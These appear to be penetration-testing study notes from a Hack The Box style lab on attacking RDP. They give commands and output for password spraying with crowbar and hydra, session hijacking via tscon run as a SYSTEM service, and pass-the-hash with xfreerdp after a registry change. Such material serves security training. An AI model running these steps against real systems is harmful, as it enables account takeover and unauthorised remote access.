**ENUMERATION**

```
nmap -Pn -p3389 192.168.2.143 

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE    SERVICE
3389/tcp open ms-wbt-server
```

### Misconfigurations

In many cases, a user account will be locked or disabled after a certain number of failed login attempts. In this case, we can perform a specific password guessing technique called Password Spraying

**Password Spraying Tools**
- Crowbar
- hydra
- flamingo

**Crowbar Example:**
```
datboyblu3@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

**Hydra Example:**
```
datboyblu3@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
```

### How to RDP

**Tools to RDP**

- rdesktop
- xfreerdo
- remmina

**RDP Example:**
```
rdesktop -u admin -p password123 192.168.2.143

Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses an invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.
     Issuer: CN=WIN-Q8F2KTAI43A

Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate, the connection atempt will be aborted:

    Subject: CN=WIN-Q8F2KTAI43A
     Issuer: CN=WIN-Q8F2KTAI43A
 Valid From: Tue Aug 24 04:20:17 2021
         To: Wed Feb 23 03:20:17 2022

  Certificate fingerprints:

       sha1: cd43d32dc8e6b4d2804a59383e6ee06fefa6b12a
     sha256: f11c56744e0ac983ad69e1184a8249a48d0982eeb61ec302504d7ffb95ed6e57

Do you trust this certificate (yes/no)? yes
```

### RDP Session Hijacking

To impersonate a user without their password you:
- must have SYSTEM privileges
- use tscon.exe - enables users to connect to another desktop session
```
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

**Obtaining SYSTEM Privileges - assuming you have local admin privs already**

You can use PsExec or Mimikatz. Or create a Windows service that, by default, will run as Local System and will execute any binary with SYSTEM privileges

1. Use sc.exe
2. Specify the service name
3. Specify the binpath - the command to be executed
```
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

Now run the command:
```
C:\htb> net start sessionhijack
```

### RDP Pass the Hash

xfreerdp can be used to execute an RDP PtH attack to gain GUI access to the target with a few caveats:
- Restricted Admin Mode should be disabled
- Enable by adding a new registry key `DisableRestrictedADmin` under  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa

Or use the below command:

```
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:

```
 xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```